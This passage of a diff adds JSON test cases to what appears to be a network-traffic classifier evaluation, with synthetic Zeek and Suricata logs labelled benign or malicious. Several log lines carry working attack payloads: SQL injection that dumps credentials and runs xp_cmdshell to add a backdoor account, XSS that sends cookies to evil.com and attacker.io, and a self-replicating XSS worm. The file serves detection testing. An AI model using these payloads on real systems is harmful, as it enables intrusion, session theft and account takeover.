+        "zeek": "1743900000.000000 CDNScat 192.168.1.44 55400 8.8.8.8 53 udp dns - 120 queries in 60s subdomain_pattern=dnscat2\ndns.log: query=session-abc123.c.dnscat2-server.com CNAME rcode=NOERROR\ndns.log: query=exec-whoami.s.dnscat2-server.com MX rcode=NOERROR answer=root\ndns.log: query=exec-id.s.dnscat2-server.com MX rcode=NOERROR",
+        "suricata": "[1:2025895:3] ET TROJAN DNScat2 C2 Session Established [Priority: 1] 2026-04-05T12:00:00 192.168.1.44 -> 8.8.8.8\n[1:2025896:2] ET TROJAN DNScat2 Command Execution Over DNS [Priority: 1] 2026-04-05T12:00:10 192.168.1.44 -> 8.8.8.8\n[1:2025897:1] ET TROJAN DNS Shell Root Execution Confirmed [Priority: 1] 2026-04-05T12:00:20 192.168.1.44 -> 8.8.8.8"
+      }
+    },
+    {
+      "id": "TC-N01",
+      "scenario": "Normal Traffic",
+      "expected_verdict": "benign",
+      "expected_severity": null,
+      "rationale": "HTTPS browsing to Google/Gmail \u2014 normal user activity",
+      "input": {
+        "zeek": "1743900000.000000 CNorm1 192.168.1.10 52341 142.250.80.46 443 tcp ssl 2.341 4096 32768 SF T T 0 ShADadfFr 15 4352 25 33792\n1743900010.000000 CNorm2 192.168.1.10 52342 172.217.14.100 443 tcp ssl 1.892 2048 16384 SF T T 0 ShADadfFr 10 2304 18 17408\nssl.log: server_name=www.google.com\nssl.log: server_name=gmail.com",
+        "suricata": ""
+      }
+    },
+    {
+      "id": "TC-N02",
+      "scenario": "Normal Traffic",
+      "expected_verdict": "benign",
+      "expected_severity": null,
+      "rationale": "DHCP + DNS + S3 access \u2014 standard workstation startup traffic",
+      "input": {
+        "zeek": "1743900000.000000 CDHCP1 192.168.1.5 68 192.168.1.1 67 udp dhcp 0.123 548 300 SF - - 0 Dd 2 604 2 356\ndns.log: query=www.amazon.com A rcode=NOERROR answers=205.251.242.103\n1743900001.000000 CS3 192.168.1.5 54231 205.251.242.103 443 tcp ssl 5.234 10240 204800 SF T T 0 ShADadfFr 25 10496 160 205824",
+        "suricata": ""
+      }
+    },
+    {
+      "id": "TC-N03",
+      "scenario": "Normal Traffic",
+      "expected_verdict": "benign",
+      "expected_severity": null,
+      "rationale": "NTP sync + corporate email \u2014 routine business traffic",
+      "input": {
+        "zeek": "1743900000.000000 CNTPV 192.168.1.100 123 pool.ntp.org 123 udp ntp 0.023 48 48 SF - - 0 Dd 1 76 1 76\n1743900000.000000 CSMTP 192.168.1.100 45231 74.125.140.26 587 tcp smtp 3.451 2048 1024 SF T T 0 ShADadfFr 10 2304 8 1280\nsmtp.log: mailfrom=user@company.com rcptto=colleague@company.com subject=Meeting Tomorrow",
+        "suricata": ""
+      }
+    },
+    {
+      "id": "TC-N04",
+      "scenario": "Normal Traffic",
+      "expected_verdict": "benign",
+      "expected_severity": null,
+      "rationale": "Windows AD traffic (SMB/LDAP/Kerberos) \u2014 normal domain authentication",
+      "input": {
+        "zeek": "1743900000.000000 CWin1 192.168.1.50 49152 192.168.1.1 445 tcp smb 0.234 4096 2048 SF T T 0 ShADadfFr 10 4352 8 2304\n1743900001.000000 CWin2 192.168.1.50 49153 192.168.1.1 389 tcp ldap 0.156 1024 512 SF T T 0 ShADadfFr 6 1280 5 768\nsmb.log: tree=\\\\DC01\\SYSVOL action=read files=GroupPolicy",
+        "suricata": ""
+      }
+    },
+    {
+      "id": "TC-N05",
+      "scenario": "Normal Traffic",
+      "expected_verdict": "benign",
+      "expected_severity": null,
+      "rationale": "Windows Update from microsoft.com \u2014 legitimate large outbound transfer",
+      "input": {
+        "zeek": "1743900000.000000 CUpdate 192.168.1.30 54321 13.107.4.50 443 tcp ssl 45.234 102400 52428800 SF T T 0 ShADadfFr 80 102656 40960 52429824\nssl.log: server_name=update.microsoft.com cert_subject=CN=Microsoft",
+        "suricata": ""
+      }
+    },
+    {
+      "id": "TC-DDOS-001",
+      "scenario": "DDoS",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "SYN flood from single external IP \u2014 50,000 half-open connections in 10 seconds, confirmed by both sources",
+      "input": {
+        "zeek": "1743900000.000000 CDDOS1 203.0.113.50 0 192.168.1.100 80 tcp - 0.000001 0 0 S0 F F 0 S 1 40 0 0\n1743900000.000100 CDDOS2 203.0.113.50 0 192.168.1.100 80 tcp - 0.000001 0 0 S0 F F 0 S 1 40 0 0\n[... 50000 SYN packets from 203.0.113.50 to 192.168.1.100:80 within 10 seconds, all S0 state]\nconn.log: 192.168.1.100 inbound_conn_rate=5000/s syn_backlog_full=true service_degraded=true",
+        "suricata": "[1:2101411:2] ET DOS Possible TCP SYN Flood [Priority: 1] 2026-04-05T12:00:00 203.0.113.50 -> 192.168.1.100:80\n[1:2101412:1] ET DOS SYN Flood Threshold Exceeded 5000pps [Priority: 1] 2026-04-05T12:00:01 203.0.113.50 -> 192.168.1.100:80\n[1:2101413:1] ET DOS Service Degradation Detected [Priority: 1] 2026-04-05T12:00:05 203.0.113.50 -> 192.168.1.100:80"
+      }
+    },
+    {
+      "id": "TC-DDOS-002",
+      "scenario": "DDoS",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "UDP amplification attack using DNS reflection \u2014 100Gbps equivalent traffic from multiple spoofed sources targeting single victim",
+      "input": {
+        "zeek": "1743900000.000000 CAMP1 8.8.8.8 53 192.168.1.200 12345 udp dns 0.001 512 0 S0 - - 0 D 1 540 0 0\n1743900000.000010 CAMP2 1.1.1.1 53 192.168.1.200 12345 udp dns 0.001 512 0 S0 - - 0 D 1 540 0 0\n1743900000.000020 CAMP3 9.9.9.9 53 192.168.1.200 12345 udp dns 0.001 512 0 S0 - - 0 D 1 540 0 0\n[... 100000 UDP packets from 50+ different DNS resolvers all targeting 192.168.1.200:12345]\nconn.log: 192.168.1.200 inbound_bandwidth=95Gbps amplification_ratio=50x unique_sources=52",
+        "suricata": "[1:2101500:3] ET DOS UDP Amplification Attack Detected [Priority: 1] 2026-04-05T12:00:00 multiple_sources -> 192.168.1.200\n[1:2101501:2] ET DOS DNS Reflection DDoS [Priority: 1] 2026-04-05T12:00:00 8.8.8.8:53 -> 192.168.1.200\n[1:2101502:1] ET DOS Bandwidth Exhaustion Attack [Priority: 1] 2026-04-05T12:00:02 multiple -> 192.168.1.200"
+      }
+    },
+    {
+      "id": "TC-DDOS-003",
+      "scenario": "DDoS",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "HTTP flood from botnet \u2014 10,000 GET requests/sec from 500 distinct IPs targeting single endpoint",
+      "input": {
+        "zeek": "1743900000.000000 CHTTP_F1 45.33.32.100 54001 192.168.1.50 80 tcp http 0.012 256 512 SF T T 0 ShADadfFr 4 512 5 768\n1743900000.000100 CHTTP_F2 45.33.32.101 54002 192.168.1.50 80 tcp http 0.011 256 512 SF T T 0 ShADadfFr 4 512 5 768\n[... 10000 HTTP GET /api/search?q=test requests/sec from 500 distinct IPs]\nhttp.log: uri=/api/search method=GET requests_per_sec=10000 unique_src_ips=500 user_agent=Mozilla/5.0_botnet",
+        "suricata": "[1:2101600:2] ET DOS HTTP Request Flood Detected [Priority: 1] 2026-04-05T12:00:00 botnet -> 192.168.1.50:80\n[1:2101601:2] ET DOS Coordinated HTTP Flood from Multiple IPs [Priority: 1] 2026-04-05T12:00:01 multiple -> 192.168.1.50\n[1:2101602:1] ET DOS Application Layer DDoS Pattern [Priority: 2] 2026-04-05T12:00:03 multiple -> 192.168.1.50:80"
+      }
+    },
+    {
+      "id": "TC-DDOS-004",
+      "scenario": "DDoS",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "ICMP flood \u2014 ping flood exhausting network bandwidth from distributed sources",
+      "input": {
+        "zeek": "1743900000.000000 CICMP1 198.51.100.10 0 192.168.1.1 0 icmp - 0.000001 1024 0 OTH - - 0 - 1 1052 0 0\n1743900000.000010 CICMP2 198.51.100.11 0 192.168.1.1 0 icmp - 0.000001 1024 0 OTH - - 0 - 1 1052 0 0\n[... 200000 ICMP echo requests from 200 sources to 192.168.1.1 within 30 seconds]\nconn.log: 192.168.1.1 icmp_pps=6666 inbound_bw=54Mbps gateway_cpu=98%",
+        "suricata": "[1:2101700:2] ET DOS ICMP Flood Detected [Priority: 1] 2026-04-05T12:00:00 multiple -> 192.168.1.1\n[1:2101701:1] ET DOS Ping Flood Threshold Exceeded [Priority: 2] 2026-04-05T12:00:05 multiple -> 192.168.1.1\n[1:2101702:2] ET DOS Network Device CPU Exhaustion [Priority: 1] 2026-04-05T12:00:10 multiple -> 192.168.1.1"
+      }
+    },
+    {
+      "id": "TC-DDOS-005",
+      "scenario": "DDoS",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "Slowloris attack \u2014 1000 slow HTTP connections holding server threads, low bandwidth but effective DoS",
+      "input": {
+        "zeek": "1743900000.000000 CSlow1 45.33.32.200 55001 192.168.1.50 80 tcp http 300.000000 128 0 S1 T T 0 ShA 2 184 0 0\n1743900001.000000 CSlow2 45.33.32.200 55002 192.168.1.50 80 tcp http 299.998000 128 0 S1 T T 0 ShA 2 184 0 0\n[... 1000 connections from 45.33.32.200 all sending partial HTTP headers, held open for 300s]\nhttp.log: src=45.33.32.200 open_connections=1000 bytes_sent_per_conn=128 server_threads_exhausted=true",
+        "suricata": "[1:2101800:2] ET DOS Slowloris Attack Pattern Detected [Priority: 2] 2026-04-05T12:00:00 45.33.32.200 -> 192.168.1.50:80\n[1:2101801:2] ET DOS HTTP Keep-Alive Exhaustion [Priority: 2] 2026-04-05T12:00:30 45.33.32.200 -> 192.168.1.50:80\n[1:2101802:1] ET DOS Web Server Thread Pool Exhaustion [Priority: 2] 2026-04-05T12:01:00 45.33.32.200 -> 192.168.1.50:80"
+      }
+    },
+    {
+      "id": "TC-SQLI-001",
+      "scenario": "SQL Injection",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Classic UNION-based SQL injection extracting database schema \u2014 confirmed by both HTTP payload and Suricata signature",
+      "input": {
+        "zeek": "1743900000.000000 CSQLI1 203.0.113.77 54321 192.168.1.20 80 tcp http 0.234 512 4096 SF T T 0 ShADadfFr 6 768 12 4352\nhttp.log: method=GET uri=/products?id=1+UNION+SELECT+table_name,column_name,null+FROM+information_schema.columns-- host=192.168.1.20 status=200 resp_body_len=4096\nhttp.log: method=GET uri=/products?id=1+UNION+SELECT+username,password,null+FROM+users-- host=192.168.1.20 status=200 resp_body_len=8192",
+        "suricata": "[1:2006445:8] ET WEB_SERVER SQL Injection Attempt UNION SELECT [Priority: 1] 2026-04-05T12:00:00 203.0.113.77:54321 -> 192.168.1.20:80\n[1:2006446:5] ET WEB_SERVER SQL Injection information_schema Access [Priority: 1] 2026-04-05T12:00:01 203.0.113.77:54321 -> 192.168.1.20:80\n[1:2006447:3] ET WEB_SERVER SQL Injection Credential Dump Attempt [Priority: 1] 2026-04-05T12:00:02 203.0.113.77:54321 -> 192.168.1.20:80"
+      }
+    },
+    {
+      "id": "TC-SQLI-002",
+      "scenario": "SQL Injection",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Blind boolean-based SQL injection \u2014 systematic true/false probing to extract data byte by byte",
+      "input": {
+        "zeek": "1743900000.000000 CSQLI2 185.220.101.10 44111 192.168.1.20 80 tcp http 0.189 384 256 SF T T 0 ShADadfFr 5 640 4 512\nhttp.log: method=GET uri=/user?id=1+AND+SUBSTRING(password,1,1)='a' status=200\nhttp.log: method=GET uri=/user?id=1+AND+SUBSTRING(password,1,1)='b' status=200\nhttp.log: method=GET uri=/user?id=1+AND+SUBSTRING(password,1,1)='c' status=404\n[... 2600 systematic requests probing each character position]\nhttp.log: total_requests_60s=2600 uri_pattern=blind_sqli_boolean",
+        "suricata": "[1:2006448:4] ET WEB_SERVER Blind SQL Injection Boolean Pattern [Priority: 1] 2026-04-05T12:00:00 185.220.101.10 -> 192.168.1.20:80\n[1:2006449:2] ET WEB_SERVER SQL Injection High Request Rate [Priority: 1] 2026-04-05T12:00:30 185.220.101.10 -> 192.168.1.20:80\n[1:2006450:1] ET WEB_SERVER Automated SQLi Tool Pattern sqlmap [Priority: 1] 2026-04-05T12:01:00 185.220.101.10 -> 192.168.1.20:80"
+      }
+    },
+    {
+      "id": "TC-SQLI-003",
+      "scenario": "SQL Injection",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Time-based blind SQL injection using SLEEP() \u2014 confirms injectable parameter and database type",
+      "input": {
+        "zeek": "1743900000.000000 CSQLI3 91.108.4.55 43221 192.168.1.20 80 tcp http 5.012 256 128 SF T T 0 ShADadfFr 4 512 3 384\nhttp.log: method=POST uri=/login body=username=admin'+AND+SLEEP(5)-- response_time=5012ms status=200\nhttp.log: method=POST uri=/login body=username=admin'+AND+IF(1=1,SLEEP(5),0)-- response_time=5008ms\nhttp.log: method=POST uri=/login body=username=admin'+AND+IF(1=2,SLEEP(5),0)-- response_time=0ms",
+        "suricata": "[1:2006451:3] ET WEB_SERVER SQL Injection SLEEP Time-Based Blind [Priority: 1] 2026-04-05T12:00:00 91.108.4.55 -> 192.168.1.20:80\n[1:2006452:2] ET WEB_SERVER SQL Injection MySQL Specific Function [Priority: 1] 2026-04-05T12:00:05 91.108.4.55 -> 192.168.1.20:80\n[1:2006453:1] ET WEB_SERVER SQLi Timing Attack Confirmed [Priority: 1] 2026-04-05T12:00:10 91.108.4.55 -> 192.168.1.20:80"
+      }
+    },
+    {
+      "id": "TC-SQLI-004",
+      "scenario": "SQL Injection",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "SQLi leading to OS command execution via xp_cmdshell \u2014 database server compromise",
+      "input": {
+        "zeek": "1743900000.000000 CSQLI4 172.16.200.5 52341 192.168.1.20 1433 tcp mssql 1.234 1024 2048 SF T T 0 ShADadfFr 8 1280 12 2304\nhttp.log: method=POST uri=/api/query body='; EXEC xp_cmdshell('whoami') -- status=200 resp=nt+authority\\system\nhttp.log: method=POST uri=/api/query body='; EXEC xp_cmdshell('net user hacker P@ss123 /add') -- status=200",
+        "suricata": "[1:2006454:4] ET WEB_SERVER MSSQL xp_cmdshell Execution Attempt [Priority: 1] 2026-04-05T12:00:00 172.16.200.5 -> 192.168.1.20:1433\n[1:2006455:2] ET WEB_SERVER SQL Injection OS Command Execution [Priority: 1] 2026-04-05T12:00:01 172.16.200.5 -> 192.168.1.20:1433\n[1:2006456:1] ET WEB_SERVER Backdoor Account Creation via SQLi [Priority: 1] 2026-04-05T12:00:02 172.16.200.5 -> 192.168.1.20:1433"
+      }
+    },
+    {
+      "id": "TC-SQLI-005",
+      "scenario": "SQL Injection",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "Error-based SQL injection probing \u2014 attacker enumerating DB errors but no data extracted yet",
+      "input": {
+        "zeek": "1743900000.000000 CSQLI5 198.51.100.88 51234 192.168.1.20 80 tcp http 0.123 256 512 SF T T 0 ShADadfFr 4 512 5 768\nhttp.log: method=GET uri=/item?id=' status=500 resp_body=MySQL+syntax+error+near+'''\nhttp.log: method=GET uri=/item?id=1' status=500 resp_body=You+have+an+error+in+your+SQL+syntax\nhttp.log: method=GET uri=/item?id=1+ORDER+BY+10-- status=500\nhttp.log: method=GET uri=/item?id=1+ORDER+BY+3-- status=200",
+        "suricata": "[1:2006457:2] ET WEB_SERVER SQL Injection Error-Based Probe [Priority: 2] 2026-04-05T12:00:00 198.51.100.88 -> 192.168.1.20:80\n[1:2006458:1] ET WEB_SERVER Database Error Message Disclosure [Priority: 2] 2026-04-05T12:00:01 198.51.100.88 -> 192.168.1.20:80\n[1:2006459:1] ET WEB_SERVER SQL Injection ORDER BY Column Enumeration [Priority: 2] 2026-04-05T12:00:02 198.51.100.88 -> 192.168.1.20:80"
+      }
+    },
+    {
+      "id": "TC-XSS-001",
+      "scenario": "XSS Injection",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Stored XSS payload injected into user profile \u2014 script will execute in all admin browsers viewing the profile",
+      "input": {
+        "zeek": "1743900000.000000 CXSS1 203.0.113.33 53001 192.168.1.20 80 tcp http 0.234 1024 512 SF T T 0 ShADadfFr 6 1280 5 768\nhttp.log: method=POST uri=/profile/update body=bio=<script>document.location='https://evil.com/steal?c='+document.cookie</script> status=200\nhttp.log: method=GET uri=/admin/users/123 status=200 resp_body=<script>document.location... [XSS payload executing in admin session]",
+        "suricata": "[1:2101900:3] ET WEB_SERVER XSS Stored Injection Attempt [Priority: 1] 2026-04-05T12:00:00 203.0.113.33 -> 192.168.1.20:80\n[1:2101901:2] ET WEB_SERVER Cross-Site Scripting Cookie Theft Payload [Priority: 1] 2026-04-05T12:00:01 203.0.113.33 -> 192.168.1.20:80\n[1:2101902:1] ET WEB_SERVER XSS Payload Triggered in Admin Context [Priority: 1] 2026-04-05T12:00:45 192.168.1.5 -> evil.com"
+      }
+    },
+    {
+      "id": "TC-XSS-002",
+      "scenario": "XSS Injection",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Reflected XSS in search parameter with session hijacking payload targeting authenticated users",
+      "input": {
+        "zeek": "1743900000.000000 CXSS2 91.108.4.77 44221 192.168.1.20 80 tcp http 0.156 768 2048 SF T T 0 ShADadfFr 5 1024 8 2304\nhttp.log: method=GET uri=/search?q=<img+src=x+onerror=fetch('https://attacker.io/log?d='+btoa(document.cookie))> status=200\nhttp.log: referrer=https://phishing-site.com/click?url=https://192.168.1.20/search?q=[encoded_xss]",
+        "suricata": "[1:2101903:3] ET WEB_SERVER XSS Reflected Injection img onerror [Priority: 1] 2026-04-05T12:00:00 91.108.4.77 -> 192.168.1.20:80\n[1:2101904:2] ET WEB_SERVER XSS Session Hijacking Payload [Priority: 1] 2026-04-05T12:00:01 91.108.4.77 -> 192.168.1.20:80\n[1:2101905:1] ET WEB_SERVER XSS Payload in Referrer Header [Priority: 2] 2026-04-05T12:00:01 91.108.4.77 -> 192.168.1.20:80"
+      }
+    },
+    {
+      "id": "TC-XSS-003",
+      "scenario": "XSS Injection",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "DOM-based XSS leading to admin account takeover \u2014 attacker changed admin password via forged request",
+      "input": {
+        "zeek": "1743900000.000000 CXSS3 172.16.200.10 52001 192.168.1.20 443 tcp ssl 2.341 2048 4096 SF T T 0 ShADadfFr 10 2304 15 4352\nhttp.log: method=GET uri=/dashboard#<script>fetch('/admin/changepass',{method:'POST',body:'newpass=hacked123',credentials:'include'})</script> status=200\nhttp.log: method=POST uri=/admin/changepass body=newpass=hacked123 src_ip=192.168.1.5 [victim admin browser] status=200\nhttp.log: method=POST uri=/login body=username=admin&password=hacked123 src_ip=172.16.200.10 status=302",
+        "suricata": "[1:2101906:2] ET WEB_SERVER DOM XSS Attack Detected [Priority: 1] 2026-04-05T12:00:00 172.16.200.10 -> 192.168.1.20:443\n[1:2101907:1] ET WEB_SERVER XSS Leads to Privilege Escalation [Priority: 1] 2026-04-05T12:00:02 192.168.1.5 -> 192.168.1.20:443\n[1:2101908:1] ET WEB_SERVER Account Takeover via XSS Confirmed [Priority: 1] 2026-04-05T12:00:05 172.16.200.10 -> 192.168.1.20:443"
+      }
+    },
+    {
+      "id": "TC-XSS-004",
+      "scenario": "XSS Injection",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "XSS probe scanning multiple endpoints \u2014 attacker testing for injection points, no confirmed execution yet",
+      "input": {
+        "zeek": "1743900000.000000 CXSS4 45.33.32.150 51111 192.168.1.20 80 tcp http 0.089 512 256 SF T T 0 ShADadfFr 4 768 3 512\nhttp.log: method=GET uri=/page?name=<script>alert(1)</script> status=200\nhttp.log: method=GET uri=/search?q=<svg/onload=alert(1)> status=404\nhttp.log: method=GET uri=/comment?text=javascript:alert(document.domain) status=200\nhttp.log: method=GET uri=/input?val=\"><script>alert(XSS)</script> status=500\n[... 40 XSS probe variants across 15 endpoints within 60 seconds]",
+        "suricata": "[1:2101909:2] ET WEB_SERVER XSS Probe Multiple Payloads [Priority: 2] 2026-04-05T12:00:00 45.33.32.150 -> 192.168.1.20:80\n[1:2101910:1] ET WEB_SERVER XSS Scanner Activity Detected [Priority: 2] 2026-04-05T12:00:30 45.33.32.150 -> 192.168.1.20:80\n[1:2101911:1] ET WEB_SERVER Automated XSS Tool Pattern [Priority: 2] 2026-04-05T12:01:00 45.33.32.150 -> 192.168.1.20:80"
+      }
+    },
+    {
+      "id": "TC-XSS-005",
+      "scenario": "XSS Injection",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "XSS worm \u2014 injected payload self-replicates by posting itself to other user profiles on the platform",
+      "input": {
+        "zeek": "1743900000.000000 CXSS5 192.168.1.88 50001 192.168.1.20 80 tcp http 0.234 4096 512 SF T T 0 ShADadfFr 8 4352 5 768\nhttp.log: method=POST uri=/api/post body=content=Hello!<script>var x=new XMLHttpRequest();x.open('POST','/api/post');x.send('content='+encodeURI(document.scripts[0].text))</script> status=200\n[... same payload auto-posted to 847 user profiles within 5 minutes via victim browsers]\nhttp.log: self_replicating_posts=847 unique_victims=847 spread_rate=169posts/min",
+        "suricata": "[1:2101912:3] ET WEB_SERVER XSS Worm Self-Replication Pattern [Priority: 1] 2026-04-05T12:00:00 192.168.1.88 -> 192.168.1.20:80\n[1:2101913:2] ET WEB_SERVER XSS Mass Propagation Detected [Priority: 1] 2026-04-05T12:01:00 multiple_victims -> 192.168.1.20:80\n[1:2101914:1] ET WEB_SERVER XSS Worm Active Spread Confirmed [Priority: 1] 2026-04-05T12:05:00 multiple -> 192.168.1.20:80"
+      }
+    },
+    {
+      "id": "TC-CC-001",
+      "scenario": "CC Attack",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Challenge Collapsar attack \u2014 high-rate HTTP requests with valid headers bypassing simple rate limits, targeting login endpoint",
+      "input": {
+        "zeek": "1743900000.000000 CCC1 45.33.32.10 54001 192.168.1.50 80 tcp http 0.234 512 256 SF T T 0 ShADadfFr 4 768 3 512\n1743900000.010000 CCC2 45.33.32.11 54002 192.168.1.50 80 tcp http 0.231 512 256 SF T T 0 ShADadfFr 4 768 3 512\n[... 3000 POST /login requests/sec from 300 IPs, all with valid cookies and realistic user agents]\nhttp.log: uri=/login method=POST requests_per_sec=3000 unique_ips=300 all_requests_complete=true cpu_usage=97%",
+        "suricata": "[1:2102000:2] ET DOS CC Attack HTTP Flood to Auth Endpoint [Priority: 1] 2026-04-05T12:00:00 multiple -> 192.168.1.50:80\n[1:2102001:2] ET DOS High Rate POST Requests Login Endpoint [Priority: 1] 2026-04-05T12:00:01 multiple -> 192.168.1.50:80\n[1:2102002:1] ET DOS Application CPU Exhaustion Confirmed [Priority: 1] 2026-04-05T12:00:05 multiple -> 192.168.1.50:80"
+      }
+    },
+    {
+      "id": "TC-CC-002",
+      "scenario": "CC Attack",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "CC attack targeting expensive API endpoint \u2014 each request triggers DB queries consuming 100ms server time, 500 req/s = full saturation",
+      "input": {
+        "zeek": "1743900000.000000 CCC_API1 203.0.113.20 54100 192.168.1.50 443 tcp ssl 0.103 1024 4096 SF T T 0 ShADadfFr 6 1280 10 4352\n[... 500 GET /api/complex-search?q=* requests/sec from 50 IPs with valid JWT tokens]\nhttp.log: uri=/api/complex-search method=GET avg_response_time=100ms requests_per_sec=500 db_connections_exhausted=true service_down=true",
+        "suricata": "[1:2102003:3] ET DOS CC Attack Expensive API Endpoint [Priority: 1] 2026-04-05T12:00:00 multiple -> 192.168.1.50:443\n[1:2102004:2] ET DOS Authenticated API Flood with Valid Tokens [Priority: 1] 2026-04-05T12:00:02 multiple -> 192.168.1.50:443\n[1:2102005:1] ET DOS Database Connection Pool Exhaustion [Priority: 1] 2026-04-05T12:00:10 multiple -> 192.168.1.50:443"
+      }
+    },
+    {
+      "id": "TC-CC-003",
+      "scenario": "CC Attack",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "CC attack with rotating proxy IPs \u2014 bypasses IP-based rate limiting by using 10,000 unique IPs from proxy pool",
+      "input": {
+        "zeek": "1743900000.000000 CCC_P1 1.2.3.4 54200 192.168.1.50 80 tcp http 0.189 512 256 SF T T 0 ShADadfFr 4 768 3 512\n1743900000.010000 CCC_P2 5.6.7.8 54201 192.168.1.50 80 tcp http 0.192 512 256 SF T T 0 ShADadfFr 4 768 3 512\n[... 2000 requests/sec from 10000 unique proxy IPs, each IP making exactly 1 request]\nhttp.log: uri=/checkout method=POST unique_src_ips=10000 requests_per_sec=2000 requests_per_ip=1 asn_diversity=low asns=5",
+        "suricata": "[1:2102006:2] ET DOS CC Attack Proxy Pool Rotation [Priority: 1] 2026-04-05T12:00:00 proxy_pool -> 192.168.1.50:80\n[1:2102007:2] ET DOS Low ASN Diversity High IP Count [Priority: 1] 2026-04-05T12:00:05 multiple -> 192.168.1.50:80\n[1:2102008:1] ET DOS Coordinated Proxy-Based Attack [Priority: 1] 2026-04-05T12:00:10 multiple -> 192.168.1.50:80"
+      }
+    },
+    {
+      "id": "TC-CC-004",
+      "scenario": "CC Attack",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "CC attack targeting image rendering endpoint \u2014 requests force server-side image processing, moderate impact",
+      "input": {
+        "zeek": "1743900000.000000 CCC_IMG1 185.220.101.20 54300 192.168.1.50 80 tcp http 1.234 256 524288 SF T T 0 ShADadfFr 4 512 400 524544\n[... 200 GET /thumbnail?url=<large_image>&size=10000x10000 requests/sec from 20 IPs]\nhttp.log: uri=/thumbnail method=GET img_processing_ms=1200 requests_per_sec=200 server_cpu=95%",
+        "suricata": "[1:2102009:2] ET DOS CC Attack Image Processing Endpoint [Priority: 2] 2026-04-05T12:00:00 multiple -> 192.168.1.50:80\n[1:2102010:1] ET DOS Server-Side Resource Exhaustion via API [Priority: 2] 2026-04-05T12:00:10 multiple -> 192.168.1.50:80\n[1:2102011:1] ET DOS CPU Intensive Endpoint Flood [Priority: 2] 2026-04-05T12:00:20 multiple -> 192.168.1.50:80"
+      }
+    },
+    {
+      "id": "TC-CC-005",
+      "scenario": "CC Attack",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "CC attack mimicking real user behavior with headless browsers \u2014 includes JS execution, mouse events, making detection harder",
+      "input": {
+        "zeek": "1743900000.000000 CCC_HB1 45.33.32.30 54400 192.168.1.50 443 tcp ssl 3.456 8192 16384 SF T T 0 ShADadfFr 15 8448 20 16640\n[... 500 sessions/min with full browser fingerprints, JS execution confirmed, mouse movement patterns]\nhttp.log: uri=/ method=GET js_executed=true mouse_events=true session_duration=3.4s requests_per_session=8 total_sessions_per_min=500",
+        "suricata": "[1:2102012:2] ET DOS Headless Browser CC Attack [Priority: 1] 2026-04-05T12:00:00 multiple -> 192.168.1.50:443\n[1:2102013:2] ET DOS Automated Browser Pool Attack [Priority: 1] 2026-04-05T12:00:30 multiple -> 192.168.1.50:443\n[1:2102014:1] ET DOS High Rate Realistic Session Flood [Priority: 1] 2026-04-05T12:01:00 multiple -> 192.168.1.50:443"
+      }
+    },
+    {
+      "id": "TC-BF-001",
+      "scenario": "Brute Force",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "RDP brute force from external IP \u2014 500 failed login attempts in 5 minutes against Windows server",
+      "input": {
+        "zeek": "1743900000.000000 CRDP1 203.0.113.99 54501 192.168.1.30 3389 tcp rdp 1.234 2048 1024 SF T T 0 ShADadfFr 8 2304 6 1280\n[... 500 RDP connection attempts from 203.0.113.99 to 192.168.1.30:3389 within 5 minutes]\nrdp.log: auth_attempts=500 auth_success=false usernames_tried=['administrator','admin','user','guest'] src=203.0.113.99",
+        "suricata": "[1:2102100:3] ET BRUTE RDP Brute Force Attempt [Priority: 1] 2026-04-05T12:00:00 203.0.113.99 -> 192.168.1.30:3389\n[1:2102101:2] ET BRUTE RDP Multiple Failed Auths [Priority: 1] 2026-04-05T12:02:00 203.0.113.99 -> 192.168.1.30:3389\n[1:2102102:1] ET BRUTE RDP 500+ Attempts Threshold [Priority: 1] 2026-04-05T12:05:00 203.0.113.99 -> 192.168.1.30:3389"
+      }
+    },
+    {
+      "id": "TC-BF-002",
+      "scenario": "Brute Force",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "FTP brute force with successful login \u2014 attacker gained access to file server using credential stuffing",
+      "input": {
+        "zeek": "1743900000.000000 CFTP_BF 172.16.100.5 55001 192.168.1.40 21 tcp ftp 0.456 512 256 SF T T 0 ShADadfFr 4 768 3 512\n[... 300 FTP auth attempts]\nftp.log: auth_attempts=300 auth_success=true user=ftpuser src=172.16.100.5 login_time=2026-04-05T12:04:55\nftp.log: command=LIST resp=200 files_visible=1847\nftp.log: command=RETR arg=payroll_2026.xlsx size=2097152",
+        "suricata": "[1:2102103:3] ET BRUTE FTP Brute Force Attack [Priority: 1] 2026-04-05T12:00:00 172.16.100.5 -> 192.168.1.40:21\n[1:2102104:2] ET BRUTE FTP Successful Login After Brute Force [Priority: 1] 2026-04-05T12:04:55 172.16.100.5 -> 192.168.1.40:21\n[1:2102105:1] ET BRUTE FTP File Access After Compromise [Priority: 1] 2026-04-05T12:05:10 172.16.100.5 -> 192.168.1.40:21"
+      }
+    },
+    {
+      "id": "TC-BF-003",
+      "scenario": "Brute Force",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "HTTP form brute force on admin panel \u2014 credential stuffing using leaked password list, 1000 attempts in 2 minutes",
+      "input": {
